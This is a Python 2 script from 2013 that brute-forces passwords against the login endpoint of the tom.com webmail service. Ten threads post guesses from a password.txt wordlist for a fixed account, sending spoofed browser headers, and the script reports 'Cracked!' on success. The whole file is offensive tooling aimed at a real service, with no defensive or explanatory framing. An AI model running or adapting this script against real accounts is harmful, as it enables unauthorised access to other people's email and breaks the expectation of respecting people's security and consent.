#-*-coding:utf-8-*-
'''
by SiRius.Gothack(gothack.329@gmail.com) 2013-03-15
'''

import urllib,cookielib,urllib2
from md5 import *
from random import *
import os
import Queue
import threading,time
 
global url
global uname
global queue
 
def crack(url,username,password):
	headers = {
           "User-Agent":"Mozilla/5.0 (X11;Linux i686) AppWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7",
           "Content-Type":"application/x-www-form-urlencoded",
           "Accept":"text/plain,*/*,q=0.01",
           "Connection":"Keep-Alive",
           "Referer":"http://web.mail.tom.com/webmail/login/index.action",
           "Accept-Encoding":"gzip,deflate,sdch",
           "Accept-Language":"zh-CN,zh;q=0.8",
           "Accept-Charset":"UTF-8,*;q=0.5",
           "Origin":"http://web.mail.tom.com",
           "Host":"web.mail.tom.com",
           "X-Requested-With":"XMLHttpRequest"
	}
	url = url
	username = username.strip()
	password = password.strip()
	print password
	values = {'username':'XXXX@tom.com','password':password}
	data = urllib.urlencode(values)
	cookiejar = cookielib.CookieJar()
	urlOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))
	
	req = urllib2.Request(url,data,headers)
	try:
		reqopen = urlOpener.open(req)
		resp = reqopen.read()
		#print resp
		#resp = dict(resp)
		#status = resp['status']
		#print status
	except urllib2.HTTPError,e:
		print e
		#status = 'error'
	#print code
	if 'OK' in resp:
		print 'Cracked!Basic Password is : ',password
		os._exit(1)
	elif password == '':
		print 'Password not found!'
		os._exit(1)
 
 
 
class Producer(threading.Thread):
	def __init__(self,FILE):
		threading.Thread.__init__(self)
		self.FILE = FILE
	def run(self):
		pwdfile = open(self.FILE)
		while True:
			if queue.qsize() > 1000:
				pass
			else:
				pwd = pwdfile.readline().strip()
				queue.put(pwd)
				#print '+',pwd
 
	
class Basic_Consumer(threading.Thread):
	def __init__(self,url,uname):
		threading.Thread.__init__(self)
		self.url = url
		self.uname = uname
	def run(self):
		while True:
			if queue.qsize() < 10:
				#print queue.qsize()
				pass
			else:
				passwd = queue.get()
				crack(self.url,self.uname,passwd)
				#print '-',passwd
 
				#print '-',passwd
 
def main():
 
	FILE = 'password.txt'
	password = open(FILE)
	uname = 'discard'
	url = 'http://web.mail.tom.com/webmail/login/loginService.action' 
	thread_count = 10
	
	
	p = Producer(FILE)
	p.start()
	time.sleep(1)
	

	print 'Auth method is Basic...'
	for i in range(thread_count):
		c = Basic_Consumer(url,uname)
		c.start()
        print c.name+' is started...'
	
if __name__=='__main__':
	queue = Queue.Queue()
	main()
